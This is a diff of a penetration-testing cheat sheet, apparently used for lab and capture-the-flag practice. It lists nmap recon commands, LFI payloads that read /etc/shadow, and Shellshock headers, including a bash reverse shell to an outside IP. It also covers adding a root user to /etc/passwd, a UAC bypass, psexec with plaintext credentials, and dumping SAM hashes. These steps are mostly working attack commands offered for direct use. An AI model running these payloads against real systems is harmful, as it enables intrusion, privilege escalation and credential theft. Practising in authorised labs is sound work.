@@ -1,38 +1,65 @@
-1. Enumeration
+1. Recon/ Info gathering
     1.1  Nmap: 
         'nmap -sC -sV -oA enum/nmap <ip> -p-'
     1.2  nmapAutomator
         './nmapAutomator full ip'
     
-2. Info gathering
-    2.1 Linux 
-        'LFI - php?list=../../../../../../../../../../etc/shadow'
-    2.2 Windows
-        'LFI -php?list=../../../../../../../../../../<>>>>'
+2. Common Vulnerabilities
+    2.1 Web
+        2.1.1 LFIs
+            2.1.1.1 Linux 
+                'LFI - php?list=../../../../../../../../../../etc/shadow'
+            2.1.1.2 Windows
+                'LFI -php?list=../../../../../../../../../../<>>>>'
+        2.1.2 Shellshock
+            2.1.2.1 cgi-bin
+                  () { :; };  
+                  () { :; };  echo $(</etc/passwd) 
+                  () { :; }; /bin/echo hello 
+                  If not then, cat $PATH from the host machine. 
+                    User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
 
  
- 3. Enumeration
+            
+        
+
+ 
+ 3.Priviliege Escalation
     3.1 Linux
+        3.1.1 Enumeration Tools
+            Download https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+            Send to the target via python -m SImpleHTTPServer <port>
+        3.1.2 SUID 
+            Copy /etc/passwd
+            Use openssl to create hash 
+               Syntax: openssl passwd -1 -salt pkong pass123  
+            Put it on the bottom of passwd
+               pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
+        3.1.3 Manual
+            ps aux
+            netstat -antup
+            uname -a
+            /etc/passwd
+            /etc/shadow
+            
+                         
+        
         'find / -perm -u=s -type f 2>/dev/null'
-    3.2 Windows
-    
-    
-    
-4. Privilege Escalation
-    4.1 Linux
-    4.2 Windows            ref: https://guif.re/windowseop#EoP%204:%20Pass%20the%20hash
+        
+ 
+    3.2 Windows            ref: https://guif.re/windowseop#EoP%204:%20Pass%20the%20hash
         4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
             'Run whoami /priv'
             'Look for SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
             'Download: https://github.com/turbo/zero2hero'
-        4.2.2 Passing cred
+        3.2.2 Passing cred
             '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'   
             
- 5. Post-Exploitation
-    5.1 Linux
-    5.2 Windows            ref : https://samsclass.info/123/proj10/px16-hashcat-win.htm
-        5.2.1 Saving Creds         
-            5.2.1.1 Manual
+ 4. Post-Exploitation
+    4.1 Linux
+    4.2 Windows            ref : https://samsclass.info/123/proj10/px16-hashcat-win.htm
+        4.2.1 Saving Creds         
+            4.2.1.1 Manual
                 Windows Hash: Security Accounts Manager
                     'reg save HKLM\SAM c:\SAM'
                     'reg save HKLM\System c:\System'
@@ -176,4 +203,7 @@ Extra Practice
     HackTheBox (Requires VIP for Retired machines) — https://www.hackthebox.eu/
     Vulnhub — https://www.vulnhub.com/
     Root-Me — https://www.root-me.org/
+    
+     The default page for Apache on Debian based OS's is "/etc/apache2/" (CentOS uses "/etc/httpd/").
+     
 
